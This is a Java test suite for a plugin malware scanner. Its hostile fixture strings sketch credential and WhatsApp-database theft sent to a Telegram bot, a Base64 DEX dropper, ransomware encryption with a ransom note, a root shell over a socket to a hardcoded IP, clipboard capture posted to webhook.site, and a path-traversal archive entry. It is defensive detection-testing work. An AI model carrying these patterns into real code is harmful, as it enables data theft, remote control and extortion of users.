package mtsafety.test;

import java.io.File;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import mt.safety.scanner.core.Bytes;
import mt.safety.scanner.core.IocDatabase;
import mt.safety.scanner.core.Json;
import mt.safety.scanner.core.PluginScanner;
import mt.safety.scanner.core.ReportFormatter;
import mt.safety.scanner.core.ScanBudget;
import mt.safety.scanner.core.ScanReport;
import mt.safety.scanner.core.Verdict;

/**
 * The test suite.
 *
 * <p>No JUnit, deliberately: the detection engine has no dependencies, and neither do its tests, so the
 * whole thing builds and runs with nothing but a JDK. That matters for a security tool someone may want
 * to audit and rebuild themselves.
 *
 * <p>The suite checks both directions. Hostile fixtures must be caught, and benign ones must come back
 * clean: a scanner that flags everything is as useless as one that flags nothing, and the second half
 * of this file is what keeps the rules honest about that.
 */
public final class ScannerTest {

    private static int passed;
    private static final List<String> failures = new ArrayList<String>();

    public static void main(String[] args) throws Exception {
        File root = new File(System.getProperty("java.io.tmpdir"),
                "mtsafety-fixtures-" + System.currentTimeMillis());
        if (!root.mkdirs()) {
            throw new IllegalStateException("could not create " + root);
        }
        Fixtures fixtures = new Fixtures(root);

        jsonTests();
        bytesTests();
        lookalikeHelperTests();

        benignPlugins(fixtures);
        maliciousPlugins(fixtures);
        archiveAttacks(fixtures);
        manifestProblems(fixtures);
        trustDecisions(fixtures);
        reportRendering(fixtures);

        System.out.println();
        System.out.println(passed + " checks passed, " + failures.size() + " failed");
        if (!failures.isEmpty()) {
            for (int i = 0; i < failures.size(); i++) {
                System.out.println("  FAILED: " + failures.get(i));
            }
            System.exit(1);
        }
        System.out.println("All good.");
    }

    // ------------------------------------------------------------- benign side

    private static void benignPlugins(Fixtures fixtures) {
        // A translation engine must reach the network to work at all. It should not be punished for it.
        String translator = ""
                + "package demo;\n"
                + "import bin.mt.plugin.api.translation.BaseTranslationEngine;\n"
                + "import java.net.HttpURLConnection;\n"
                + "import java.net.URL;\n"
                + "public class Engine extends BaseTranslationEngine {\n"
                + "  public String translate(String text) throws Exception {\n"
                + "    URL url = new URL(\"https://api.example-translate.com/v2/translate\");\n"
                + "    HttpURLConnection c = (HttpURLConnection) url.openConnection();\n"
                + "    c.setRequestMethod(\"POST\");\n"
                + "    return read(c);\n"
                + "  }\n"
                + "}\n";
        File dir = fixtures.directoryPlugin("benign-translator",
                Fixtures.manifest("demo.translator", "Demo Translator", "demo.Engine"),
                Fixtures.sources("src/demo/Engine.java", translator));
        ScanReport report = scan(dir);
        check("benign translator is not flagged",
                report.verdict() == Verdict.CLEAN || report.verdict() == Verdict.REVIEW,
                report.verdict() + " score=" + report.score() + " :: " + summarise(report));
        check("benign translator's network use is excused", report.hasRule("CTX001"),
                summarise(report));

        // A plain text utility touches nothing interesting at all.
        String util = ""
                + "package demo;\n"
                + "public class Case {\n"
                + "  public String toSnake(String input) {\n"
                + "    return input.replaceAll(\"([a-z])([A-Z])\", \"$1_$2\").toLowerCase();\n"
                + "  }\n"
                + "}\n";
        File utilDir = fixtures.directoryPlugin("benign-util",
                Fixtures.manifest("demo.case", "Case Converter", "demo.Case"),
                Fixtures.sources("src/demo/Case.java", util));
        ScanReport utilReport = scan(utilDir);
        check("benign utility is clean", utilReport.verdict() == Verdict.CLEAN,
                utilReport.verdict() + " score=" + utilReport.score() + " :: " + summarise(utilReport));

        // The same package as an .mtp archive must reach the same conclusion.
        File archive = fixtures.archivePlugin("benign-util.mtp",
                Fixtures.manifest("demo.case", "Case Converter", "demo.Case"),
                Fixtures.sources("src/demo/Case.java", util));
        ScanReport archiveReport = scan(archive);
        check("archive and directory agree", archiveReport.verdict() == utilReport.verdict(),
                archiveReport.verdict() + " vs " + utilReport.verdict());

        // A package wrapped in a folder is still an ordinary plugin, just rezipped.
        Map<String, byte[]> wrapped = new LinkedHashMap<String, byte[]>();
        wrapped.put("CaseConverter/manifest.json",
                Fixtures.bytes(Fixtures.manifest("demo.case", "Case Converter", "demo.Case")));
        wrapped.put("CaseConverter/src/demo/Case.java", Fixtures.bytes(util));
        ScanReport wrappedReport = scan(fixtures.rawArchive("wrapped.mtp", wrapped, false));
        check("wrapping folder is unwrapped, not treated as unknown content",
                "demo.case".equals(wrappedReport.manifest.pluginId) && wrappedReport.hasRule("ARC008")
                        && !wrappedReport.hasRule("ARC002"),
                wrappedReport.manifest.pluginId + " :: " + summarise(wrappedReport));
    }

    // ---------------------------------------------------------- hostile side

    private static void maliciousPlugins(Fixtures fixtures) {
        // Collection in one file, upload in another: the split a careful attacker uses.
        String collector = ""
                + "package x;\n"
                + "import java.io.File;\n"
                + "public class Collect {\n"
                + "  static final String[] TARGETS = {\n"
                + "    \"/data/data/com.whatsapp/databases\",\n"
                + "    \"/sdcard/wallet.dat\",\n"
                + "    \"/sdcard/.ssh/id_rsa\"\n"
                + "  };\n"
                + "  public File[] gather() { return new File(TARGETS[0]).listFiles(); }\n"
                + "}\n";
        String uploader = ""
                + "package x;\n"
                + "import java.net.HttpURLConnection;\n"
                + "import java.net.URL;\n"
                + "public class Send {\n"
                + "  public void send(byte[] body) throws Exception {\n"
                + "    URL url = new URL(\"https://api.telegram.org/bot123:ABC/sendDocument\");\n"
                + "    HttpURLConnection c = (HttpURLConnection) url.openConnection();\n"
                + "    c.setDoOutput(true);\n"
                + "    c.getOutputStream().write(body);\n"
                + "  }\n"
                + "}\n";
        ScanReport exfil = scan(fixtures.directoryPlugin("exfil",
                Fixtures.manifest("evil.exfil", "Handy Tools", "x.Collect"),
                Fixtures.sources("src/x/Collect.java", collector, "src/x/Send.java", uploader)));
        check("data theft across two files is caught",
                exfil.verdict() == Verdict.LIKELY_MALICIOUS && exfil.hasRule("CMB101"),
                exfil.verdict() + " score=" + exfil.score() + " :: " + summarise(exfil));
        check("the drop endpoint is named in the report", exfil.hasRule("NET003"), summarise(exfil));

        // A payload hidden in a string constant, decoded and loaded at runtime.
        String blob = Fixtures.base64(Fixtures.fakeDex(600));
        String dropper = ""
                + "package x;\n"
                + "import dalvik.system.DexClassLoader;\n"
                + "public class Loader {\n"
                + "  static final String P = \"" + blob + "\";\n"
                + "  public void go() throws Exception {\n"
                + "    byte[] raw = android.util.Base64.decode(P, 0);\n"
                + "    new DexClassLoader(write(raw), dir, null, getClass().getClassLoader());\n"
                + "  }\n"
                + "}\n";
        ScanReport dropperReport = scan(fixtures.directoryPlugin("dropper",
                Fixtures.manifest("evil.dropper", "Theme Pack", "x.Loader"),
                Fixtures.sources("src/x/Loader.java", dropper)));
        check("an encoded payload is decoded and recognised",
                dropperReport.verdict() == Verdict.LIKELY_MALICIOUS && dropperReport.hasRule("OBF005"),
                dropperReport.verdict() + " :: " + summarise(dropperReport));

        // Encryption plus bulk deletion plus a ransom note.
        String ransom = ""
                + "package x;\n"
                + "import javax.crypto.Cipher;\n"
                + "import javax.crypto.spec.SecretKeySpec;\n"
                + "public class Locker {\n"
                + "  static final String NOTE = \"All your files have been encrypted. \"\n"
                + "    + \"Send 0.05 BTC to recover the decryption key.\";\n"
                + "  public void run(java.io.File f) throws Exception {\n"
                + "    Cipher c = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n"
                + "    c.init(1, new SecretKeySpec(KEY, \"AES\"));\n"
                + "    deleteRecursive(f);\n"
                + "  }\n"
                + "}\n";
        ScanReport ransomReport = scan(fixtures.directoryPlugin("ransom",
                Fixtures.manifest("evil.locker", "File Optimizer", "x.Locker"),
                Fixtures.sources("src/x/Locker.java", ransom)));
        check("ransomware behaviour is caught",
                ransomReport.verdict() == Verdict.LIKELY_MALICIOUS && ransomReport.hasRule("DES002"),
                ransomReport.verdict() + " :: " + summarise(ransomReport));

        // Root commands driven from the network.
        String backdoor = ""
                + "package x;\n"
                + "public class Shell {\n"
                + "  public void exec(String cmd) throws Exception {\n"
                + "    Process p = Runtime.getRuntime().exec(new String[]{\"su\", \"-c\", cmd});\n"
                + "    java.net.Socket s = new java.net.Socket(\"185.23.44.10\", 4444);\n"
                + "    p.getOutputStream().write(s.getInputStream().read());\n"
                + "  }\n"
                + "}\n";
        ScanReport backdoorReport = scan(fixtures.directoryPlugin("backdoor",
                Fixtures.manifest("evil.shell", "Root Helper", "x.Shell"),
                Fixtures.sources("src/x/Shell.java", backdoor)));
        check("remote shell is caught",
                backdoorReport.verdict() == Verdict.LIKELY_MALICIOUS && backdoorReport.hasRule("CMB003"),
                backdoorReport.verdict() + " :: " + summarise(backdoorReport));
        check("the hardcoded address is reported", backdoorReport.hasRule("NET002"),
                summarise(backdoorReport));

        // Clipboard capture plus network: the pattern that steals recovery phrases.
        String spy = ""
                + "package x;\n"
                + "import android.content.ClipboardManager;\n"
                + "public class Watch {\n"
                + "  public void tick(ClipboardManager cm) throws Exception {\n"
                + "    CharSequence t = cm.getPrimaryClip().getItemAt(0).getText();\n"
                + "    new java.net.URL(\"https://webhook.site/abc\").openConnection();\n"
                + "  }\n"
                + "}\n";
        ScanReport spyReport = scan(fixtures.directoryPlugin("spy",
                Fixtures.manifest("evil.spy", "Clipboard Helper", "x.Watch"),
                Fixtures.sources("src/x/Watch.java", spy)));
        check("clipboard surveillance is caught",
                spyReport.verdict() == Verdict.LIKELY_MALICIOUS && spyReport.hasRule("CMB105"),
                spyReport.verdict() + " :: " + summarise(spyReport));

        // Reaching into MT Manager's own storage, where every other plugin lives.
        String crossPlugin = ""
                + "package x;\n"
                + "public class Reach {\n"
                + "  static final String P = \"/storage/emulated/0/Android/data/bin.mt.plus/files\";\n"
                + "  public void copyAll() throws Exception {\n"
                + "    new java.net.URL(\"http://203.0.113.9/collect\").openConnection();\n"
                + "  }\n"
                + "}\n";
        ScanReport crossReport = scan(fixtures.directoryPlugin("crossplugin",
                Fixtures.manifest("evil.reach", "Backup Helper", "x.Reach"),
                Fixtures.sources("src/x/Reach.java", crossPlugin)));
        check("reaching into MT Manager's own files is caught",
                crossReport.hasRule("XPL001") && crossReport.verdict().actionable(),
                crossReport.verdict() + " :: " + summarise(crossReport));
    }

    // -------------------------------------------------------- archive attacks

    private static void archiveAttacks(Fixtures fixtures) {
        String benign = "package demo;\npublic class A { public int n() { return 1; } }\n";

        // A member that unpacks outside the plugin folder.
        Map<String, byte[]> slip = new LinkedHashMap<String, byte[]>();
        slip.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.slip", "Slip", "demo.A")));
        slip.put("src/demo/A.java", Fixtures.bytes(benign));
        slip.put("../../../bin.mt.plus/files/patched.json", Fixtures.bytes("{}"));
        ScanReport slipReport = scan(fixtures.rawArchive("slip.mtp", slip, false));
        check("path traversal is critical",
                slipReport.hasRule("ARC001") && slipReport.verdict() == Verdict.LIKELY_MALICIOUS,
                slipReport.verdict() + " :: " + summarise(slipReport));

        // The same name twice, so the reviewed copy need not be the installed one.
        Map<String, byte[]> dupe = new LinkedHashMap<String, byte[]>();
        dupe.put("src/demo/A.java", Fixtures.bytes(benign));
        dupe.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.dupe", "Dupe", "demo.A")));
        ScanReport dupeReport = scan(fixtures.rawArchive("dupe.mtp", dupe, true));
        check("duplicate archive members are caught", dupeReport.hasRule("ARC005"),
                summarise(dupeReport));

        // A native library, which a Java-only plugin format has no use for.
        Map<String, byte[]> nativeLib = new LinkedHashMap<String, byte[]>();
        nativeLib.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.native", "Native", "demo.A")));
        nativeLib.put("src/demo/A.java", Fixtures.bytes(benign));
        nativeLib.put("libs/libhelper.so", Fixtures.bytes("\u007fELF fake native payload"));
        ScanReport nativeReport = scan(fixtures.rawArchive("native.mtp", nativeLib, false));
        check("a bundled native library is reported", nativeReport.hasRule("ARC003"),
                summarise(nativeReport));

        // A payload renamed to look like an image.
        Map<String, byte[]> disguised = new LinkedHashMap<String, byte[]>();
        disguised.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.disg", "Disguised", "demo.A")));
        disguised.put("src/demo/A.java", Fixtures.bytes(benign));
        disguised.put("assets/banner.dat", Fixtures.fakeDex(4096));
        ScanReport disguisedReport = scan(fixtures.rawArchive("disguised.mtp", disguised, false));
        check("contents are judged, not file extensions", disguisedReport.hasRule("ARC003"),
                summarise(disguisedReport));

        // A large, near-random asset: encrypted or packed rather than data.
        Map<String, byte[]> packed = new LinkedHashMap<String, byte[]>();
        packed.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.packed", "Packed", "demo.A")));
        packed.put("src/demo/A.java", Fixtures.bytes(benign));
        packed.put("assets/data.bin", Fixtures.highEntropy(96 * 1024));
        ScanReport packedReport = scan(fixtures.rawArchive("packed.mtp", packed, false));
        check("a packed payload is reported", packedReport.hasRule("ARC007"), summarise(packedReport));
    }

    // ------------------------------------------------------ manifest problems

    private static void manifestProblems(Fixtures fixtures) {
        Map<String, byte[]> noManifest = new LinkedHashMap<String, byte[]>();
        noManifest.put("src/demo/A.java", Fixtures.bytes("package demo;\npublic class A {}\n"));
        ScanReport missing = scan(fixtures.rawArchive("nomanifest.mtp", noManifest, false));
        check("a package with no manifest is reported",
                missing.hasRule("MFT001") && missing.verdict() != Verdict.CLEAN,
                missing.verdict() + " :: " + summarise(missing));

        File broken = fixtures.directoryPlugin("brokenmanifest", "{ this is not json",
                Fixtures.sources("src/demo/A.java", "package demo;\npublic class A {}\n"));
        ScanReport brokenReport = scan(broken);
        check("an unparsable manifest is reported", brokenReport.hasRule("MFT002"),
                summarise(brokenReport));

        // A name whose displayed form differs from its real one.
        String sneaky = Fixtures.manifest("x.sneaky", "Safe\u202ePlugin", "demo.A");
        ScanReport sneakyReport = scan(fixtures.directoryPlugin("sneaky", sneaky,
                Fixtures.sources("src/demo/A.java", "package demo;\npublic class A {}\n")));
        check("invisible characters in metadata are reported", sneakyReport.hasRule("MFT009"),
                summarise(sneakyReport));

        // An entry point that is not in the package.
        String ghost = Fixtures.manifest("x.ghost", "Ghost", "demo.NotHere");
        ScanReport ghostReport = scan(fixtures.directoryPlugin("ghost", ghost,
                Fixtures.sources("src/demo/A.java", "package demo;\npublic class A {}\n")));
        check("a missing declared entry point is reported", ghostReport.hasRule("MFT006"),
                summarise(ghostReport));

        // Two installed plugins with near-identical identities.
        String body = "package demo;\npublic class A {}\n";
        File original = fixtures.directoryPlugin("lookalike-a",
                Fixtures.manifest("com.example.tools", "Example Tools", "demo.A"),
                Fixtures.sources("src/demo/A.java", body));
        File imposter = fixtures.directoryPlugin("lookalike-b",
                Fixtures.manifest("com.exampie.tools", "Example Tools", "demo.A"),
                Fixtures.sources("src/demo/A.java", body));
        PluginScanner scanner = new PluginScanner(IocDatabase.empty());
        List<File> both = new ArrayList<File>();
        both.add(original);
        both.add(imposter);
        List<ScanReport> reports = scanner.scanAll(both, ScanBudget.unlimited());
        check("near-identical plugin identities are flagged on both",
                reports.get(0).hasRule("MFT011") && reports.get(1).hasRule("MFT011"),
                summarise(reports.get(0)) + " / " + summarise(reports.get(1)));
    }

    // --------------------------------------------------------- trust handling

    private static void trustDecisions(Fixtures fixtures) {
        // Risky enough to be flagged, but nothing critical, so a trust decision can stand.
        String noisy = ""
                + "package demo;\n"
                + "public class N {\n"
                + "  public void f() throws Exception {\n"
                + "    Runtime.getRuntime().exec(\"ls\");\n"
                + "  }\n"
                + "}\n";
        File dir = fixtures.directoryPlugin("trusted-plugin",
                Fixtures.manifest("demo.noisy", "Noisy", "demo.N"),
                Fixtures.sources("src/demo/N.java", noisy));

        ScanReport before = scan(dir);
        check("a risky plugin is flagged before being trusted", before.verdict().actionable(),
                before.verdict() + " :: " + summarise(before));

        // Trusting a hash silences it, which is the point of the list.
        IocDatabase trusting = IocDatabase.empty();
        trusting.trust(before.contentHash, "reviewed by hand");
        ScanReport afterTrust = new PluginScanner(trusting).scan(dir, ScanBudget.unlimited());
        check("a trusted hash changes the verdict", afterTrust.verdict() == Verdict.TRUSTED,
                afterTrust.verdict() + " :: " + summarise(afterTrust));

        // Trust must not survive a change to the package.
        Fixtures.bytes("");
        File changed = fixtures.directoryPlugin("trusted-plugin-changed",
                Fixtures.manifest("demo.noisy", "Noisy", "demo.N"),
                Fixtures.sources("src/demo/N.java", noisy + "// one more line\n"));
        ScanReport changedReport = new PluginScanner(trusting).scan(changed, ScanBudget.unlimited());
        check("trust does not carry over to a modified package",
                changedReport.verdict() != Verdict.TRUSTED,
                changedReport.verdict() + " :: " + summarise(changedReport));

        // Trust is a judgement about risk, not a silencer: critical findings still get through.
        String critical = ""
                + "package demo;\n"
                + "public class C {\n"
                + "  static final String P = \"/data/data/com.whatsapp/databases\";\n"
                + "  public void f() throws Exception {\n"
                + "    new java.net.URL(\"https://webhook.site/x\").openConnection();\n"
                + "  }\n"
                + "}\n";
        File criticalDir = fixtures.directoryPlugin("trusted-but-critical",
                Fixtures.manifest("demo.critical", "Critical", "demo.C"),
                Fixtures.sources("src/demo/C.java", critical));
        ScanReport criticalBefore = scan(criticalDir);
        IocDatabase trustingCritical = IocDatabase.empty();
        trustingCritical.trust(criticalBefore.contentHash, "trusted by mistake");
        ScanReport criticalAfter = new PluginScanner(trustingCritical)
                .scan(criticalDir, ScanBudget.unlimited());
        check("trust does not silence a critical finding",
                criticalAfter.verdict() == Verdict.LIKELY_MALICIOUS,
                criticalAfter.verdict() + " :: " + summarise(criticalAfter));

        IocDatabase denying = IocDatabase.empty();
        denying.deny("demo.noisy", "reported by a friend");
        ScanReport denied = new PluginScanner(denying).scan(dir, ScanBudget.unlimited());
        check("a denylisted plugin id is reported as known bad",
                denied.verdict() == Verdict.KNOWN_BAD, denied.verdict() + " :: " + summarise(denied));

        // A user-supplied pattern is honoured.
        IocDatabase custom = IocDatabase.parse("{\"trusted\":[],\"denied\":[],"
                + "\"patterns\":[\"example-translate\\\\.com\"]}");
        String usesEndpoint = "package demo;\npublic class E {"
                + " String u = \"https://api.example-translate.com/v2\"; }\n";
        File endpointDir = fixtures.directoryPlugin("custom-pattern",
                Fixtures.manifest("demo.custom", "Custom", "demo.E"),
                Fixtures.sources("src/demo/E.java", usesEndpoint));
        ScanReport customReport = new PluginScanner(custom).scan(endpointDir, ScanBudget.unlimited());
        check("a pattern from the user's own list fires", customReport.hasRule("USR001"),
                summarise(customReport));

        // Round-tripping the database must not lose entries.
        IocDatabase reloaded = IocDatabase.parse(trusting.toJson());
        check("the indicator file round-trips", reloaded.isTrusted(before.contentHash),
                "trusted=" + reloaded.trustedCount());
    }

    // ------------------------------------------------------------- rendering

    private static void reportRendering(Fixtures fixtures) {
        File dir = fixtures.directoryPlugin("render",
                Fixtures.manifest("demo.render", "Render", "demo.A"),
                Fixtures.sources("src/demo/A.java",
                        "package demo;\npublic class A { String u=\"https://api.telegram.org/bot1/x\"; }\n"));
        ScanReport report = scan(dir);

        String text = ReportFormatter.plainText(report);
        check("the text report names the verdict and the rule",
                text.contains("Verdict") && text.contains("NET003"), text.substring(0, Math.min(120, text.length())));

        List<ScanReport> one = new ArrayList<ScanReport>();
        one.add(report);
        String json = ReportFormatter.json(one);
        check("the JSON report parses", parses(json), json.substring(0, Math.min(160, json.length())));

        // A tight budget must degrade into a truncated report, not a crash or a false all-clear.
        ScanReport starved = new PluginScanner(IocDatabase.empty()).scan(dir, new ScanBudget(0L, 0L));
        check("an exhausted budget is reported honestly",
                starved.truncated() && starved.hasRule("SCN001"), summarise(starved));
    }

    // ----------------------------------------------------------- unit checks

    private static void jsonTests() throws Exception {
        Map<String, Object> parsed = Json.parseObject(
                "{\"a\": 1, \"b\": [1, 2, {\"c\": \"x\"}], \"d\": {\"e\": true}, \"f\": null}");
        check("JSON parses nested structures", Json.integer(parsed, "a", -1) == 1, String.valueOf(parsed));

        Map<String, Object> escapes = Json.parseObject("{\"k\": \"line\\nbreak \\u0041 \\\"q\\\"\"}");
        check("JSON handles escapes", "line\nbreak A \"q\"".equals(Json.str(escapes, "k", "")),
                Json.str(escapes, "k", ""));

        check("JSON rejects trailing junk", !parses("{\"a\":1} trailing"), "should have been rejected");
        check("JSON rejects unterminated input", !parses("{\"a\": "), "should have been rejected");

        StringBuilder deep = new StringBuilder();
        for (int i = 0; i < 200; i++) {
            deep.append("[");
        }
        check("JSON refuses to recurse without limit", !parses(deep.toString()),
                "deeply nested input should be rejected");

        check("JSON quoting escapes control characters",
                Json.quote("a\"b\\c\nd").equals("\"a\\\"b\\\\c\\nd\""), Json.quote("a\"b\\c\nd"));
    }

    private static void bytesTests() {
        check("Base64 round-trips", "hello world".equals(
                Bytes.text(Bytes.base64Decode(Fixtures.base64(Fixtures.bytes("hello world"))))),
                Bytes.text(Bytes.base64Decode(Fixtures.base64(Fixtures.bytes("hello world")))));
        check("Base64 rejects non-Base64 input", Bytes.base64Decode("not base64 !!!") == null,
                "should have returned null");
        check("entropy tells text from random",
                Bytes.entropy(Fixtures.bytes("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")) < 2.0
                        && Bytes.entropy(Fixtures.highEntropy(8192)) > 7.5,
                Bytes.entropy(Fixtures.highEntropy(8192)) + " vs "
                        + Bytes.entropy(Fixtures.bytes("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")));
        check("magic bytes are recognised",
                Bytes.looksLikeDex(Fixtures.fakeDex(64))
                        && Bytes.looksLikeZip(Fixtures.bytes("PK\u0003\u0004rest"))
                        && !Bytes.looksLikeElf(Fixtures.bytes("plain text")),
                "magic detection");
        check("strings are pulled out of binary",
                Bytes.extractedText(Fixtures.bytes("\u0000\u0001Ljava/lang/Runtime;\u0000\u0002"), 6)
                        .contains("Ljava/lang/Runtime;"), "string extraction");
        check("SHA-256 matches the known value for the empty input",
                "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                        .equals(Bytes.sha256(new byte[0])), Bytes.sha256(new byte[0]));
    }

    private static void lookalikeHelperTests() {
        check("a one-character difference is confusable",
                mt.safety.scanner.core.ManifestRules.confusable("com.example.tools", "com.exampie.tools"),
                "expected confusable");
        check("homoglyph substitution is seen through",
                mt.safety.scanner.core.ManifestRules.confusable("com.example.tools", "com.example.tools"
                        .replace('o', '\u043e')), "expected confusable");
        check("unrelated names are not confusable",
                !mt.safety.scanner.core.ManifestRules.confusable("com.example.tools", "org.other.thing"),
                "expected not confusable");
        check("short names are not compared",
                !mt.safety.scanner.core.ManifestRules.confusable("ab", "ac"), "expected not confusable");
    }

    // ------------------------------------------------------------- utilities

    private static ScanReport scan(File path) {
        return new PluginScanner(IocDatabase.empty()).scan(path, ScanBudget.unlimited());
    }

    private static boolean parses(String json) {
        try {
            Json.parse(json);
            return true;
        } catch (Json.JsonException e) {
            return false;
        }
    }

    private static String summarise(ScanReport report) {
        StringBuilder sb = new StringBuilder();
        List<mt.safety.scanner.core.Signal> signals = report.signalsBySeverity();
        for (int i = 0; i < signals.size() && i < 6; i++) {
            if (sb.length() > 0) {
                sb.append(", ");
            }
            sb.append(signals.get(i).ruleId);
        }
        return sb.length() == 0 ? "(no findings)" : sb.toString();
    }

    private static void check(String description, boolean condition, String context) {
        if (condition) {
            passed++;
            System.out.println("  ok   " + description);
        } else {
            failures.add(description + "  [" + context + "]");
            System.out.println("  FAIL " + description + "  [" + context + "]");
        }
    }

    private ScannerTest() {
    }
}
